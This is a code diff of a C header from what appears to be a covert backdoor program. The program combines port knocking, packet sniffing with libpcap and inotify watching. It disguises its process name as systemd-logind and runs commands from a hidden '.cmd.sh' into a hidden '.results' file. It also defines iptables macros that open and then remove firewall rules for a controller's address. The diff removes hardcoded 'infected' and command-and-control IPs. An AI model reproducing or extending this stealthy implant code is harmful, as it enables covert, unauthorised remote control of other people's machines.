@@ -26,6 +26,7 @@
 #include "../src/covert_wrappers.h"
 #include "../src/portknocking.h"
 #include "../src/inotify.h"
+#include "../src/libpcap.h"
 #include <unistd.h>
 #include <time.h>
 
@@ -80,15 +81,9 @@ struct sniff_tcp {
 #define MASK "/usr/lib/systemd/systemd-logind"
 #define CMD "./.cmd.sh > .results"
 #define CHMOD "chmod 755 .cmd.sh"
-#define IPTABLE "iptables -I INPUT -p "
-#define SOURCE " -s "
-#define DPORT " --dport "
-#define ACCEPT " -j ACCEPT"
-#define IPTABLES(ip,protocol,port) "iptables -I INPUT 1 -p " protocol " -s " ip " --dport " port " -j ACCEPT"
-#define TURNOFF(ip) "iptables -D INPUT -p tcp -s " ip " --dport 8505 -j ACCEPT"
+#define IPTABLES(ip,protocol,port) "iptables -I INPUT -p " protocol " -s " ip " --dport " port " -j ACCEPT"
+#define TURNOFF(ip,protocol,port) "iptables -D INPUT -p " protocol "  -s " ip " --dport " port " -j ACCEPT"
 #define RESULT_FILE ".results"
-#define INFECTEDIP "192.168.0.100"
-#define CNCIP "192.168.0.109"
 #define FILENAME ".cmd.sh"
 struct payload{
     char key[5]; // always 8505
